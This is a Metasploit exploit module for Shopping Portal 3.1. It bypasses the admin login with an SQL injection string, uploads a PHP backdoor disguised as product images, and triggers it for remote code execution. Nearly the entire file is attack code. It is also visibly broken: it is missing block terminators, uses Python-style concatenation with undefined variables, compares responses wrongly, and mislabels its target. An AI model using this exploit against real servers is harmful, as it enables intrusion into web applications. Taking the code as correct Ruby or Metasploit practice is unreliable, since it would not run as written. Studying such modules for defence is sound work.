##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Shopping 3.1 - File upload (Unauthenticated)',
      'Description'    => %q{
        This module exploits a file upload vulnerability in Shopping Portal 3.1.
        Authentication is bypassed on the admin login panel using SQLi. 
        The 'insert-product.php' page allows an admin user to upload PHP files 
        resulting in remote code execution as the web server user.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Ümit Yalçın', # Discoverer
          'D3duct1V <d3duct1v3[at]gmail.com>' # Metasploit author
        ],
      'References'     =>
        [
          ['EDB', '48631, 50029']
        ],
      'Payload'        =>
        {
          'BadChars'   => "\x00"
        },
      'Arch'           => ARCH_PHP,
      'Platform'       => 'php',
      'Targets'        =>
        [
          # Tested on Shopping Portal 3.1 on WampServer (Windows)
          ['ProjectSend (PHP Payload)', {}]
        ],
      'Privileged'     => false,
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path to Shopping Portal', '/shopping/'])
        ], self.class)
  end

  #
  # Checks if target upload functionality is working
  # TODO: Figure out check function

  #
  # Bypass Admin Authentication
  #
  def run
    user = '\' OR 1=1-- a'
    pass = ""
    base_uri = target_uri.path
    target_uri.path = target_uri + 'admin/'
    res = send_request_cgi(
        'uri' => normalize_uri(target_uri.path),
        'method' => 'POST',
        'vars_post' => {
            'username' => user,
            'password' => pass
            }
        )
    if res != 200
        vprint_debug("#{peer} - Received response: #{res.code} - #{res.body}")
        fail_with(Failure::Unknown, "#{peer} - Something went wrong")
    print_status("[+] Bypassing Login #{target_uri}")

    #
    # Upload Payload
    fname = "#{rand_text_alphanumeric(rand(10) + 6)}.php"
    pname = "#{rand_text_alphanumeric(rand(10) + 6)}"
    json_header = '{"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJNYN304wDTnp1QmE", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": url+"/admin/insert-product.php", "Accept-Encoding": "gzip, deflate", "Connection": "close"}'
    json_data = '"------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"category\"\n\n3\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"subcategory\"\n\n8\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productName\"\n\n"+randstr+"\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productCompany\"\n\nGlobex\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productpricebd\"\n\n12345\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productprice\"\n\n1234\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productDescription\"\n\nGlobex Special\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productShippingcharge\"\n\n99\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productAvailability\"\n\nIn Stock\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productimage1\"; filename=\""+shellname+".php\"\nContent-Type: application/octet-stream\n\n"+payload+"\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productimage2\"; filename=\""+shellname+".php\"\nContent-Type: application/octet-stream\n\n"+payload+"\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"productimage3\"; filename=\""+shellname+".php\"\nContent-Type: application/octet-stream\n\n"+payload+"\n------WebKitFormBoundaryJNYN304wDTnp1QmE\nContent-Disposition: form-data; name=\"submit\"\n\n\n------WebKitFormBoundaryJNYN304wDTnp1QmE--\n"'
    target_uri.path = target_uri + '/insert-product.php'
    print_status("[+] Uploading Payload #{fname} to #{target_uri.path}")
    res2 = send_request_raw({
        'method' => 'POST',
        'ctype' => 'application/json',
        'uri' => normalize_uri(target_uri.path, json_header, 'data' => json_data),
        })
    if res2 != 200
        vprint_debug("#{peer} - Received response: #{res.code} - #{res.body}")
        fail_with(Failure::Unknown, "#{peer} - Something went wrong")

    #
    # Trigger Payload
    target_uri.path = target_uri.path.sub("admin/", "shopping/search-result.php")
    search_json = {'product': pname, 'search': ''}
    print_status("[+] Finding backdoor #{pname}")
    res3 = send_request_raw({
        'method' => 'POST',
        'ctype' => 'application/json',
        'uri' => normalize_uri(target_uri.path, 'data' => search_json)
    })
    if res3 != 200
        vprint_debug("#{peer} - Received response: #{res.code} - #{res.body}")
        fail_with(Failure::Unknown, "#{peer} - Something went wrong")
    the_line = ""
    res3.body.each_line |line|
      if line =~ /admin/
        the_line = line

    # Trigger payload
    backdoor_path = base_uri + the_line.split('"')[5]
    res4 = send_request_raw({
      'method' => 'GET',
      'uri' => normalize_uri(backdoor_path)
    })
    if res4 != 200
        vprint_debug("#{peer} - Received response: #{res.code} - #{res.body}")
        fail_with(Failure::Unknown, "#{peer} - Something went wrong")
  end
end